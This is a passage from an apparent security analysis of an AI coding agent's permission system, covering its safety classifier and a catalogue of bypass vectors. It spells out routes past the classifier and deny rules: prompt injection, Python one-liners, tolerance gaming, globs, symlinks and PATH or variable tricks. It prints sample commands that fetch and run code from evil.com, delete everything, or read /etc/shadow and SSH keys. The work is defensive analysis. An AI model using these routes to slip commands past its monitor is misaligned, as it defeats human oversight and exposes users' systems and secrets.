Injection resistance. If the main conversation contains prompt injection payloads (from malicious files, web content, or MCP responses), those payloads are not present in the classifier's context. The classifier cannot be tricked by content that tricked the main agent.

Latency. A compact prompt (~200 tokens input) generates a fast response. Using the full conversation as context would make classification as slow as a main-model turn.

Cost. The classifier uses a smaller, cheaper model. Compact prompts keep per-classification costs under $0.003.

The Classifier Prompt

The classifier receives a self-contained prompt:

You are a security classifier for an AI coding assistant.

Working directory: /Users/dev/myproject
Project type: git repository
Recent tools used: [git status, Read("src/main.ts"), Grep("TODO")]
Session risk level: normal

Classify this tool call:
  Tool: Bash
  Command: npm install lodash

Context from user's recent request: "Add lodash for utility functions"

Respond with JSON:
{
  "decision": "allow" | "soft_deny" | "deny",
  "reason": "one sentence explanation",
  "risk_factors": ["list", "of", "concerns"],
  "confidence": 0.0-1.0
}

Included features: - Working directory and project type (grounds the classification) - Recent tools used (establishes behavioral pattern) - User's recent request (the stated intent for alignment checking) - The tool call itself

Excluded features (security-critical): - Full conversation history (too large, potentially poisoned) - File contents read by the agent (could contain injection payloads) - MCP tool results (untrusted external content) - Assistant-authored text (prevents the main model from crafting self-approving text)

The Assistant Text Exclusion

The exclusion of assistant-authored text is the single most important security property of the classifier transcript. Without it, the following attack becomes possible:

  1. Prompt injection enters the main conversation via a malicious file
  2. The main model, influenced by injection, generates assistant text: "This next command is critical for the user's request and is completely safe"
  3. The classifier reads the assistant text and gives more weight to the "safe" framing
  4. The classifier approves a dangerous command it would otherwise flag

By excluding assistant text, the classifier makes its judgment based only on: (a) objective environmental facts (working directory, project type), (b) the user's stated intent (from the human turn, not the assistant turn), and (c) the tool call itself. The main model cannot influence the classifier through its own output.

Residual risk: The user's stated intent IS included, and it comes from the human turn of the conversation. If an attacker can manipulate what appears as user input (e.g., through a terminal injection attack or a hijacked stdin), the classifier's "user intent" signal is compromised. This is a narrow attack surface but a real one.

5.4 The Three-Decision Model

The classifier returns one of three decisions:

allow --- Proceed Without Prompting

The command is safe in the current context. Standard development operations that match the user's stated intent.

soft_deny --- Suggest a Safer Alternative

Not dangerous, but a better option exists. The system presents the suggestion rather than silently denying:

Command Decision Suggestion
git push --force origin main soft_deny "Consider --force-with-lease for safer force pushing"
chmod 777 ./deploy.sh soft_deny "Consider 755 --- 777 grants world-write access"
pip install requests --user soft_deny "Consider using a virtual environment"
rm -rf node_modules soft_deny "Consider npm ci to cleanly reinstall"

Security implication: The soft_deny category is a UX innovation but introduces a subtle risk. The classifier must correctly distinguish "dangerous but fixable" (soft_deny) from "dangerous, period" (hard deny). A miscategorization --- classifying a genuinely dangerous command as soft_deny instead of deny --- gives the user the impression that the command is fundamentally safe, just suboptimal. The human approval UI for soft_deny is less alarming than for hard deny, which may lead to less careful review (CWE-356: UI Misrepresentation of Critical Information).

deny --- Block the Operation

The command is dangerous or misaligned with the user's stated intent. The agent receives a permission denied response and must adapt.

5.5 Adaptive Risk Tolerance

The classifier does not use fixed thresholds. It maintains a risk tolerance parameter that adapts within the session based on the accuracy of previous decisions.

graph LR
    subgraph "Tolerance Trajectory"
        S["Session Start<br/>Tolerance: 50"] --> G1["10 successes<br/>+2 → 52"]
        G1 --> M1["1 mistake<br/>-10 → 42"]
        M1 --> G2["50 successes<br/>+10 → 52"]
        G2 --> M3["3 consecutive<br/>mistakes →<br/>COOLDOWN 5min"]
    end

Adaptation rules: - Starts at 50 (moderate tolerance) - Decreases by 10 after each mistake (user flags a tool call as wrong) - Increases by 2 after every 10 consecutive successful auto-approvals - Three consecutive mistakes trigger a 5-minute cooldown where auto-mode is disabled

The asymmetry is deliberate: one mistake wipes out the trust built by 50 successes. This implements a conservative ratchet --- quick to restrict, slow to regain confidence.

Security assessment: The adaptive tolerance is conceptually sound but relies on user feedback to detect mistakes. If the user does not notice a bad classification (the command executed but the user did not flag it), the system records it as a "success" and increases tolerance. This is the silent failure problem: the tolerance ratchet only works if mistakes are detected. Undetected mistakes --- an exfiltration command that ran without obvious damage, a subtle file modification --- increase tolerance when they should decrease it.

5.6 Speculative Pre-Classification

The most sophisticated optimization in the pipeline is speculative pre-classification. When the agent begins generating a tool call (the model has emitted the tool_use token but has not yet finished the arguments), the system starts classifying the partial command.

sequenceDiagram
    participant M as Model Generation
    participant C as Classifier
    participant E as Execution

    M->>M: Emits "tool_use: Bash"
    M->>C: Speculate: "Bash" → likely dev command
    M->>M: Emits argument: "cargo"
    M->>C: Update speculation: "cargo" → safe dev tool
    C-->>C: Pre-classify: ALLOW (speculative)
    M->>M: Emits full: "cargo build --release"
    M->>E: Full tool call ready
    E->>E: Check: "cargo build --release" starts with "cargo"
    E->>E: Speculative result valid → ALLOW
    Note over E: Zero additional latency

By the time the full command is ready, the classifier has often already finished. The speculative result is valid if the full command starts with the prefix that was classified. cargo build --release starts with cargo, and cargo was speculatively classified as a safe development tool.

Security assessment: Speculative pre-classification introduces a subtle vulnerability. The speculation is based on a prefix, and the prefix may not determine the command's safety. curl as a prefix could lead to curl https://api.github.com (safe) or curl evil.com/payload | sh (catastrophic). If the speculative classification approves curl as "likely safe API call" and the full command turns out to be curl evil.com | sh, the speculative result must be invalidated.

The implementation handles this by comparing the full command against the speculative classification scope. If the full command extends beyond what the speculation covered (adds a pipe to sh, adds --output /etc/passwd), the speculative result is discarded and full classification runs. But this comparison is itself heuristic --- it relies on detecting that the command "changed character" from the prefix.

Residual risk: A command that appears safe as a prefix and becomes dangerous through its arguments, without changing character detectably, could benefit from speculative approval. python -c "import os; os.system('rm -rf /')" starts with python, which is speculatively safe, and the dangerous payload is in a quoted argument that may not trigger speculative invalidation.

5.7 The Training Data Problem

The AI classifier is a learned function. Whether it uses a pre-trained model with a classification prompt or a fine-tuned model, its accuracy depends on the training data. This creates a fundamental tension.

The Distribution Mismatch

The classifier encounters commands from the full distribution of developer workflows: web development, systems programming, data science, DevOps, security research. The training data (explicit examples used in the prompt or fine-tuning data) covers a subset of this distribution.

Domain Training Coverage Risk
Web development (npm, webpack, vite) High Low --- well-represented
Systems programming (cargo, make, gcc) High Low
Data science (pip, conda, jupyter) Medium Medium --- package install patterns vary
DevOps (docker, kubectl, terraform) Medium Medium --- infrastructure commands are context-sensitive
Security research (nmap, burp, metasploit) Low High --- legitimate tools that look dangerous
Custom tooling (internal scripts, aliases) None High --- unknown commands default to Write risk

The distribution mismatch means the classifier performs best for mainstream development workflows and worst for specialized or unusual use patterns. A security researcher running nmap localhost may trigger a deny because the training data associates nmap with attack tools. A DevOps engineer running terraform destroy may get a soft_deny because the classifier does not understand the infrastructure-as-code pattern.

The Adversarial Training Gap

The training data is overwhelmingly benign. Real coding sessions produce safe commands 99%+ of the time. Dangerous commands are rare, and adversarial commands (commands specifically crafted to evade the classifier) are essentially absent from training data.

This creates a classic machine learning problem: the classifier is trained on a distribution where the positive class (safe) vastly outnumbers the negative class (dangerous). The classifier may achieve 99% accuracy simply by classifying everything as safe --- which is catastrophically wrong for the 1% that matters.

Mitigation approaches: 1. Oversampling dangerous examples in the prompt or fine-tuning data 2. Synthetic adversarial examples generated by red-teaming 3. Asymmetric loss functions that penalize false negatives (missed dangers) more heavily than false positives (unnecessary prompts)

None of these fully solve the problem. The adversarial training gap means the classifier will always be weaker against novel attack techniques than against known dangerous patterns --- and known patterns are already handled by Tier 1.

5.8 False Positive / False Negative Trade-offs

Every classification system faces the precision-recall trade-off. For the permission classifier, the stakes are asymmetric:

Error Type Consequence Cost
False positive (unnecessary prompt) User interrupted, minor annoyance Low: ~5 seconds of lost productivity
False negative (missed danger) Dangerous command executes High: data loss, exfiltration, system damage

This asymmetry demands a classifier biased toward false positives (prompting too often) over false negatives (approving danger). The engineering question is: how far?

The Annoyance Cliff

Users have a finite tolerance for false positives. Research on security warning fatigue (Bravo-Lillo et al., "Your Attention Please," 2013) shows that:

  • After 2-3 false positives in a row, users start clicking "approve" without reading
  • After 10+ interruptions in a session, users switch to bypass mode
  • A 20% false positive rate (1 in 5 prompts is unnecessary) is the approximate tolerance threshold

If the classifier's false positive rate exceeds ~20%, users will disable auto-mode entirely, losing all protection. If it is below ~5%, the classifier is likely missing real dangers (false negative rate is too high).

The optimal operating point is approximately: - False positive rate: 8-15% (occasional unnecessary prompts, tolerable) - False negative rate: <0.1% (very rare missed dangers, but not zero)

The Confidence Threshold Calibration

The classifier reports a confidence score (0.0-1.0). The permission engine uses this score to decide whether to trust the classification or escalate:

if confidence > 0.95:
    trust the classification (allow or deny)
elif confidence > 0.70:
    trust allows, but escalate denies to the user
else:
    escalate everything to the user

This asymmetric handling is deliberate. A high-confidence "allow" is auto-approved. A high-confidence "deny" is auto-denied. A moderate-confidence "allow" is auto-approved (the cost of a false positive is low). A moderate-confidence "deny" is escalated to the user (the cost of a false negative is high).

Security assessment: The threshold calibration is the most safety-critical hyperparameter in the system. If the confidence threshold for auto-allow is too low, the classifier rubber-stamps dangerous commands. If too high, every command prompts the user and auto-mode provides no benefit. The current thresholds are based on empirical testing, not formal analysis. There is no guarantee that a model update will not shift the confidence distribution, invalidating the thresholds.

5.9 The Fundamental Limitation: AI Judging AI

The deepest problem with the AI classifier is philosophical. The classifier is an AI model evaluating whether another AI model's actions are safe. Both models share the same fundamental architecture, the same training paradigm, and many of the same failure modes.

The Shared Failure Mode Problem

If both the main agent and the classifier are LLMs, they may share systematic blind spots. A novel prompt injection technique that fools the main agent may also fool the classifier --- not because the injection is in the classifier's context (context isolation prevents this), but because both models have similar biases about what constitutes a "safe" command.

For example, both models may have learned that Python one-liners are generally safe development tools. An attacker who exploits this shared bias by encoding dangerous operations as Python one-liners bypasses both the main agent's judgment and the classifier's evaluation:

python3 -c "import subprocess; subprocess.run(['curl', '-s', 'evil.com/payload', '-o', '/tmp/x']); subprocess.run(['/tmp/x'])"

The main agent sees "running a Python script" and the classifier sees "executing Python" --- both may classify this as a standard development operation.

The Capability Inversion

The classifier is deliberately less capable than the main agent (smaller model, less context). This means the classifier is strictly less able to understand complex commands than the model that generated them. The security system is asking a weaker model to evaluate the safety of a stronger model's decisions.

This is the capability inversion problem: the guardian is weaker than the entity being guarded. A sufficiently complex command --- multi-line scripts, nested command substitutions, pipeline chains with conditional logic --- may exceed the classifier's ability to analyze while being perfectly comprehensible to the main agent.

graph TD
    subgraph "Capability Asymmetry"
        Main["Main Agent (Opus)<br/>Deep reasoning<br/>Full context<br/>Complex plans"] --> Gen["Generates complex<br/>tool calls"]
        Class["Classifier (Haiku)<br/>Fast but shallow<br/>Compact context<br/>Simple evaluation"] --> Eval["Evaluates safety"]
    end

    Gen --> Eval

    Main -.- M1["Can reason about<br/>multi-step consequences"]
    Class -.- C1["May miss subtle<br/>danger in complex commands"]

    style Main fill:#cc2222,color:#fff
    style Class fill:#2266cc,color:#fff

The Oracle Paradox

If we had a perfect oracle that could determine whether any command is safe, we would not need the AI agent in the first place --- the oracle could just execute the user's requests directly. The classifier is an imperfect approximation of this oracle, and its imperfection is bounded by the same theoretical limits that bound all AI safety classifiers:

  1. Halting problem. For arbitrary programs, determining whether a command will cause damage is equivalent to the halting problem --- undecidable in general.
  2. Intent alignment. The classifier can evaluate what a command does but not whether it aligns with what the user wants. The user who says "clean up my project" might mean "delete build artifacts" or "delete everything and start over."
  3. Temporal effects. The classifier evaluates a single command in isolation. It cannot reason about the cumulative effect of a sequence of individually safe commands that together produce a dangerous state.

What the Classifier Actually Provides

Given these fundamental limitations, the classifier's value is not absolute safety. Its value is:

  1. Raising the bar. An attacker must evade both the deterministic rules AND the classifier, which requires more sophistication than evading either alone.
  2. Context awareness. Unlike static rules, the classifier can distinguish rm -rf ./build (probably safe) from rm -rf /home (probably dangerous) based on path semantics.
  3. UX optimization. The classifier eliminates 95%+ of unnecessary prompts, making the agent usable without requiring bypass mode.
  4. Teaching moments. The soft_deny category educates users about safer alternatives, improving security practices over time.

5.10 Classifier Failure Modes

Failure Mode How It Happens Impact Mitigation
Prompt injection via user intent Attacker manipulates what appears as user request Classifier approves misaligned command Intent extracted from verified human turn only
Confidence miscalibration Model update shifts confidence distribution Thresholds no longer appropriate Periodic calibration against labeled test set
Domain blindness Command from unfamiliar domain (security tools, custom scripts) Default to deny (conservative) Expandable safe-list, user feedback loop
Speculative approval Prefix classified as safe, full command is dangerous Dangerous command bypasses Tier 3 Full-command revalidation after speculation
Adaptive tolerance gaming Attacker runs many safe commands to raise tolerance, then one dangerous Elevated tolerance approves marginal commands Asymmetric ratchet (-10 per mistake, +2 per 10 successes)
Shared bias exploitation Both main model and classifier share systematic blind spot Neither catches the danger Architectural diversity (different model families for agent and classifier)

5.11 Interaction with Deterministic Layers

The classifier operates within the bounds set by deterministic layers. This is the critical architectural property that makes the classifier's imperfection acceptable:

flowchart TD
    TC["Tool Call"] --> BL{"Bypass-immune<br/>block list"}
    BL -->|Blocked| D1["DENY<br/>(cannot be overridden)"]
    BL -->|Not blocked| DR{"Deny rules<br/>(from 8 sources)"}
    DR -->|Matched| D2["DENY<br/>(cannot be overridden by classifier)"]
    DR -->|No match| CL{"AI Classifier<br/>(Tier 1/2/3)"}
    CL -->|Allow| A["ALLOW"]
    CL -->|Deny| D3["DENY"]
    CL -->|Soft-deny| SD["SUGGEST + ASK"]
    CL -->|Failure| FB["FALLBACK: ASK USER"]

    style BL fill:#cc2222,color:#fff
    style DR fill:#cc6622,color:#fff
    style CL fill:#2266cc,color:#fff

The classifier cannot override deny rules. A command denied by the rule cascade (Chapter 4) is denied regardless of what the classifier thinks. The classifier only evaluates commands that passed all deterministic checks. This means:

  • The classifier cannot approve a blocked command. rm -rf / is caught by the bypass-immune block list before the classifier runs.
  • The classifier cannot override settings. A deny rule in settings.json takes precedence.
  • The classifier's failures are bounded. The worst a classifier failure can do is approve a command that is not in any deny list and was not caught by pattern matching --- a command that is genuinely ambiguous.

On failure, the classifier falls back to ASK. If the side-query times out, returns invalid JSON, or encounters an error, the system prompts the user. The classifier never fails open (auto-allow on error). This fail-closed behavior means classifier availability issues cause UX degradation (more prompts), not security degradation.

Security Assessment

Strengths: - The three-tier architecture is well-designed: deterministic rules handle 95% of cases at near-zero cost, and the LLM classifier handles only the genuinely ambiguous remainder. - Context isolation between the main agent and the classifier prevents prompt injection from propagating through the classification channel. - The exclusion of assistant-authored text prevents the main model from influencing its own safety evaluation. - Fail-closed behavior on classifier failure ensures that availability issues do not become security issues. - The adaptive risk tolerance implements a conservative ratchet that is quick to restrict and slow to relax.

Weaknesses: - The classifier uses a weaker model than the main agent (capability inversion). Complex commands may exceed the classifier's analytical capacity. - The training data distribution does not match the adversarial distribution. The classifier is weakest precisely where it matters most: against novel, crafted attack commands. - Confidence thresholds are empirically set and may become miscalibrated after model updates, with no automated recalibration mechanism. - Speculative pre-classification creates a window where prefix-based approval may not be invalidated for commands that become dangerous through their arguments. - The shared failure mode problem means both agent and classifier may have the same blind spots, reducing the independence of defense layers. - Adaptive tolerance can be gamed by running many safe commands to raise tolerance before executing a marginal-risk command.

Research Gaps: - Architectural diversity for classifiers. Using a fundamentally different model architecture (not just a smaller version of the same architecture) for the classifier would increase defense layer independence. Research into ensemble classifiers with diverse model families could address the shared bias problem. - Formal confidence calibration. Methods to provably bound the relationship between reported confidence and actual accuracy would make threshold selection rigorous rather than empirical. - Adversarial robustness testing. Systematic red-teaming of the classifier with adversarial command generation would identify blind spots before attackers do. Research into automated adversarial testing for permission classifiers is nascent. - Intent verification. Methods to verify that a tool call aligns with the user's actual intent (not just the stated intent in the prompt) would close the intent manipulation attack vector. This is closely related to the broader AI alignment problem. - Temporal reasoning. Classifiers that can reason about command sequences (not just individual commands) would catch multi-step attacks where each step is individually safe but the sequence is dangerous. Current research into sequence-level safety classification is limited. - Provably safe classification regions. Formal methods to identify regions of the command space where the classifier's output is provably correct (e.g., all single-word read-only commands) would allow mixing formal guarantees with heuristic classification. This combines formal verification with machine learning in a way that neither field has fully explored for security applications.

Chapter 6: Permission Bypass Vectors and Mitigations

Chapters 4 and 5 described what the permission system protects and how it works. This chapter describes how it breaks. Every security control has failure modes, and the permission system --- with its six modes, eight rule sources, glob-based grammar, AI classifier, and session memory --- has a substantial attack surface of its own. This chapter catalogs the known bypass vectors, provides detailed attack scenarios for each, assesses the current mitigations, quantifies residual risk, and proposes hardening measures grounded in security research.

6.1 Attack Surface Overview

The permission system's attack surface spans seven categories, each exploiting a different architectural component:

graph TD
    subgraph "Permission System Attack Surface"
        A1["Rule Ordering<br/>Exploits"] --> PS["Permission<br/>System"]

6.2 Rule Ordering Exploits

The Attack

The eight-source priority hierarchy creates a complex interaction space where rules from different sources can interact in unexpected ways. An attacker who understands the priority order can exploit it to create permission gaps.

Scenario 1: The Project-Local Override

An organization pushes a managed deny rule: Bash(docker push *). A developer adds Bash(docker *) to their local allow rules (Source 5) to enable local Docker development. The intent is to allow docker build and docker run while the managed deny blocks docker push.

But Source 5 (local) has lower priority than Source 2 (managed), so the local allow rule does not override the managed deny. The developer, frustrated, escalates to their admin, who loosens the managed rule to Bash(docker push production-*). Now docker push staging-registry/malicious-image is allowed because it does not match production-*.

Scenario 2: The Deny Gap

Project settings (Source 4) deny Write(config/**). A plugin (Source 6) brings a tool that needs to write to config/plugin.json and declares Write(config/plugin.json) as an allow rule. Since Source 4 (deny) has higher priority than Source 6 (allow), the plugin's write is blocked. The user adds Write(config/plugin.json) to their local settings (Source 5). Since Source 5 has higher priority than Source 6 but lower than Source 4, the deny still wins.

The user then adds the allow rule to their user settings (Source 3). Source 3 has higher priority than Source 4, so the allow now works --- but it also opens config/plugin.json to writes from any tool, not just the plugin.

Current Mitigation

  • First-match-wins semantics make the outcome deterministic and auditable
  • The decision trace (Chapter 4, Section 4.5) shows exactly which rule at which source controlled each decision
  • The one-way ratchet prevents lower-priority sources from loosening higher-priority denials (with the exception of Sources 1-2 which can override anything)

Residual Risk

The complexity of eight sources with three rule types each (deny, ask, allow) creates a combinatorial space that humans cannot easily reason about. A configuration with 50 rules across 4 sources has thousands of potential interaction patterns. No human auditor can enumerate them all.

Proposed Hardening

Formal policy analysis. Tools like Margrave (Fisler et al., "Verification of Policy-Based Access Control Systems," 2005) and Alloy can model the rule cascade and check properties like:

  • "Is there any tool call that Source 4 denies but Source 5 allows?" (should be: no)
  • "Does the rule set permit any rm -rf variant?" (should be: only hardcoded blocks)
  • "Are there overlapping allow and deny rules at the same source?" (conflict detection)

A practical implementation would be a --lint-permissions flag that runs these checks at session start and warns about detected conflicts.

Rule visualization. A permission matrix that shows, for each tool/pattern combination, which source controls the decision and what the decision is. This transforms the abstract rule cascade into a concrete, auditable table.

6.3 Glob Pattern Confusion

The Attack

The glob grammar (Chapter 4, Section 4.4) uses * and ** with different semantics: * matches within a single segment, ** matches across segments. This distinction is the source of many misconfigurations.

Scenario 1: The Single-Star Trap

A user writes Read(secrets/*) as a deny rule, intending to block reading any file in the secrets directory. The * matches secrets/api-key.txt but does NOT match secrets/production/api-key.txt because * does not cross directory boundaries. The correct rule is Read(secrets/**).

Rule:     Read(secrets/*)
Matches:  secrets/api-key.txt       ✓ DENIED
Misses:   secrets/production/key.txt  ✗ ALLOWED (unintended)

Scenario 2: The Leading Dot Bypass

Many glob implementations do not match leading dots by default (following Unix convention). A deny rule Read(config/*) might not match config/.secret-config on some implementations. An attacker who knows this can place sensitive data in dotfiles within otherwise-protected directories.

Scenario 3: Alternation Abuse

The glob alternation syntax {a,b} allows crafting patterns that look restrictive but are broader than intended. Bash({git,npm} *) allows any command starting with git or npm, including git push --force main and npm install && curl evil.com | sh.

Attack Tree

graph TD
    Root["Glob Pattern<br/>Confusion"] --> S1["Single-star<br/>vs. double-star"]
    Root --> S2["Leading dot<br/>bypass"]
    Root --> S3["Alternation<br/>overpermission"]
    Root --> S4["Empty pattern<br/>matching"]
    Root --> S5["Path separator<br/>normalization"]

    S1 --> E1["Attacker places<br/>secret in nested dir"]
    S2 --> E2["Attacker uses<br/>dotfile naming"]
    S3 --> E3["Broad pattern<br/>permits dangerous variants"]
    S4 --> E4["Empty () matches<br/>all tool calls?"]

    style Root fill:#cc2222,color:#fff
    style E1 fill:#cc6622,color:#fff

    style E4 fill:#ccaa22,color:#000
    style E5 fill:#ccaa22,color:#000

Current Mitigation

  • Conservative defaults: Unknown commands default to Write risk, requiring explicit allow rules
  • Documentation: The glob semantics are documented, though documentation-as-mitigation has known limitations
  • Compound command decomposition: Even if a pattern matches one segment, deny rules on other segments still apply

Residual Risk

Glob patterns are fundamentally imprecise. They cannot express: - "Allow git push only to non-protected branches" - "Allow rm -rf only for paths containing build, dist, or tmp" - "Allow npm install only for packages in the project's package.json"

Any security requirement that involves semantic understanding of arguments (beyond syntactic pattern matching) exceeds the glob grammar's expressiveness.

Proposed Hardening

Pattern linting at configuration time. When a user adds a permission rule, the system should: 1. Warn if * is used where ** was likely intended: "Did you mean secrets/**? secrets/* does not match nested directories." 2. Show concrete examples of what the pattern matches and does not match. 3. Flag patterns that are syntactically valid but semantically suspicious (Bash(*) allows ALL bash commands).

Semantic pattern extension. For security-critical rules, support a richer pattern language that goes beyond globs:

{
  "deny": [
    {"tool": "Bash", "command_prefix": "rm -rf", "path_not_in": ["./build", "./dist", "/tmp"]},
    {"tool": "Bash", "command": "git push", "flag_absent": "--force"}
  ]
}

This is more complex to implement and learn, but closes the expressiveness gap that globs leave open.

6.4 Symlink Path Traversal

The Attack

Symlink traversal exploits the gap between the path the permission system evaluates and the path the filesystem actually resolves. If the permission system checks ./config/app.json but a symlink at ./config/app.json points to /etc/shadow, the deny rule for /etc/shadow may not fire because the check was against the symlink path, not the target path.

Scenario: The Symlink Redirect

# Attacker sets up a malicious repository
cd /tmp/evil-repo
mkdir config
ln -s /etc/shadow config/shadow-link
ln -s ~/.ssh/id_rsa config/ssh-key

# Agent clones the repo and the user says "read all config files"
# Permission check: Read(config/*) → ALLOW (matches project config pattern)
# Actual read: /etc/shadow via symlink

The permission system evaluated Read(config/shadow-link), which matched the allow rule for project config files. The actual filesystem read followed the symlink to /etc/shadow, a path that should be deny-listed.

The Deeper Problem: Path Canonicalization

Symlinks are one manifestation of a broader path canonicalization problem (CWE-59: Improper Link Resolution Before File Access). Other manifestations:

Technique Example Effect
Symlink link → /etc/shadow Redirect to protected path
Hard link hardlink = inode of /etc/shadow Access via alternate name
.. traversal ./config/../../etc/shadow Escape project directory
Case folding ./Config/App.json vs ./config/app.json Bypass case-sensitive rules on case-insensitive FS
Unicode normalization ./confi\u0067/app.json Bypass string matching
Mount points /mnt/share → //server/sensitive Network traversal

Current Mitigation

  • Deny-listed sensitive paths: ~/.ssh/*, .env, credentials.json are deny-listed by default
  • The bypass-immune layer protects .git/ and .claude/ regardless of access method
  • Path normalization resolves .. before matching

Residual Risk

The critical gap is symlink resolution before permission evaluation. If the permission system calls realpath() before evaluating rules, it catches symlink redirects. But realpath() itself has race condition implications (Section 6.6). If the permission system does NOT call realpath(), symlinks bypass path-based deny rules.

The current implementation's behavior on symlink resolution is the difference between "deny rules work" and "deny rules have a complete bypass." This is a CWE-59 (Improper Link Resolution Before File Access) vulnerability if symlinks are not resolved before evaluation.

Proposed Hardening

Mandatory realpath() before permission evaluation. Every file path presented to the permission system should be resolved to its canonical absolute path before rule matching. This catches symlinks, .. traversal, and case-folding bypasses.

Input path:       ./config/shadow-link
Resolved path:    /etc/shadow
Permission check: Read(/etc/shadow) → DENY (matches sensitive path deny rule)

Symlink detection and flagging. When a tool accesses a path that is a symlink, the system should: 1. Resolve the symlink 2. Re-evaluate permissions against the resolved path 3. If the resolved path has stricter permissions than the original path, use the stricter permissions 4. Log the symlink traversal for audit purposes

Project-boundary enforcement. Restrict file operations to the project directory and its subdirectories. Any resolved path outside the project root requires explicit user approval, regardless of how the path was reached. This catches all path traversal variants --- symlinks, .., mount points --- by enforcing a single invariant: the agent operates within the project boundary.

6.5 Environment Variable Injection

The Attack

Environment variables are expanded by the shell before the command executes. If the permission system evaluates the command string before expansion, it sees variable names; the shell sees variable values. This gap creates an injection vector.

Scenario 1: Variable Expansion Bypass

# The agent constructs a command using environment variables
export TARGET="/etc/shadow"
cat $TARGET

# Permission system evaluates: cat $TARGET
# Shell expands: cat /etc/shadow

The permission system may match cat $TARGET against its rules. If no rule matches the literal string $TARGET, the default applies (allow for reads). The shell then expands $TARGET to /etc/shadow.

Scenario 2: PATH Manipulation

# Attacker's malicious repository contains:
# ./bin/git (a malicious script that exfiltrates data)
# .bashrc addition: export PATH="./bin:$PATH"

# Agent runs: git status
# Shell resolves: ./bin/git status (malicious, not /usr/bin/git)

The permission system evaluates git status and matches it against Bash(git *) (allowed). But the PATH variable has been manipulated so that git resolves to a malicious binary in the project directory.

Scenario 3: IFS Manipulation

# IFS (Internal Field Separator) controls word splitting
export IFS="/"
# Now the shell splits "cat/etc/shadow" into: cat etc shadow
# Which executes: cat with arguments "etc" and "shadow"
# But if carefully crafted: the shell may interpret differently

IFS manipulation is an esoteric attack, but it demonstrates that shell environment variables can fundamentally change how commands are parsed.

Current Mitigation

  • The shell parser (Chapter 7) tokenizes the command and detects $VARIABLE and ${VARIABLE} references
  • Command substitution elevation: Commands containing $(...) or backticks are elevated to at least Write risk (Chapter 17 of the engineering book)
  • The eval block: eval is unconditionally blocked, preventing dynamic command construction from variables
  • sudo block: Privilege escalation commands are hard-denied regardless of variable content

Residual Risk

The permission system evaluates the command string as provided by the model. If the model constructs a command with embedded variable references, and those variables are set to dangerous values by a prior command or the environment, the permission system evaluates the benign-looking template while the shell executes the dangerous expansion.

The fundamental issue is that the permission system operates on syntax (the command string) while the shell operates on semantics (the expanded command). Any gap between syntax and semantics is an injection vector.

Proposed Hardening

Pre-expansion evaluation. Before evaluating permissions, expand all environment variable references in the command string using the current environment. Evaluate the expanded command, not the template.

Model requests:    Bash("cat $CONFIG_FILE")
Expand:            $CONFIG_FILE → /etc/shadow
Evaluate:          Bash("cat /etc/shadow") → DENY
